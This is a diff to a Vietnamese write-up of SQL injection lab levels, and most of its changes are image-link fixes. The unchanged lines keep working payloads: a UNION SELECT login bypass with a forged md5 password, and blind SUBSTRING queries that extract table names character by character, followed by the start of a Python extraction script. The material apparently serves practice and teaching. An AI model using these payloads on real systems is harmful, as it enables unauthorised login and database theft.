@@ -5,7 +5,7 @@ username=/&password=) union select 'admin' #
 ```
 
 # Level 5:
-![691](sql_injection_pipeline-level-5.png)
+![](images/sql_injection_pipeline-level-5.png)
 ```php
 <?php
 function loginHandler($username, $password)
@@ -44,7 +44,7 @@ function loginHandler($username, $password)
 username=' UNION SELECT 'admin', md5('123') -- &password=123
 ```
 - Ở đây có thể thấy được password gốc là:
-![885](images/real_password.png)
+![](images/real_password.png)
 - PoC rằng sau khi làm giả md5 hash có thể thấy password đã thay đổi theo đoạn string mà ta mong muốn
 ![886](images/fake_password.png)
 
@@ -59,14 +59,13 @@ SUBSTRING((SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_
 ```sql
 (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=0x706f7374735f6462)=1 #
 ```
-![[images/7-ky-tu.png]]
-
+![](images/7-ky-tu.png)
 ```sql
 -- exfiltrate từng ký tự trong bảng có tên không phải là 'posts'
 SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='posts_db' AND table_name != 'posts' LIMIT 0,1),1,1) = 'a' #
 ```
 - đã thử thành công với vị trí số 1:
-![[images/Xac-dinh-ky-tu-dau-tien.png]]
+![](images/Xac-dinh-ky-tu-dau-tien.png)
 - bây giờ là viết script python để exfiltrate hết toàn bộ 7 ký tự (có thể làm tay nhưng viết script đi cho giống hắc cơ)
 ```python
 import requests
